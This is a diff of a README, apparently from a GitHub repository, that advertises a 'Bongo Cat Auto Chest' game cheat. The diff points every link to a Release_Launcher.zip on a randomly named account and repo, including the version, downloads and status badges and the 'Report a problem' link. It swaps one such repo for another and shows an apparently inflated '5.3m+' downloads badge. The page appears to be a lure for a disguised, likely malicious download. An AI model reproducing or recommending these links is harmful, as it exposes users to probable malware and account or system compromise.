@@ -2,10 +2,10 @@
 
 **Auto-claim normal and emote chests, open stored tokens, and control your pet score in Bongo Cat.** Play normally through Steam after installing the patch. Optional startup repair checks the patch before launching the game and reapplies it after compatible Steam updates. The helper does not need to stay open during play.
 
-[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[![Downloads](https://img.shields.io/badge/Downloads-5.3m%2B-blue?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[Download Bongo Cat Auto Chest v1.3.0 for Windows](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip) · [All releases](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip) · [Report a problem](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
+[![Downloads](https://img.shields.io/badge/Downloads-5.3m%2B-blue?style=for-the-badge)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
+[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
+[Download Bongo Cat Auto Chest v1.3.0 for Windows](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip) · [All releases](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip) · [Report a problem](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
 
 ![Bongo Cat Auto Chest v1.2 in Bongo Cat General settings: normal and emote auto-claim, Keep pets, token claim buttons, and pet score editor]
 <img width="589" height="622" alt="image" src="https://github.com/user-attachments/assets/3dd2011b-1658-4ca6-b50d-22a8beef38af" />
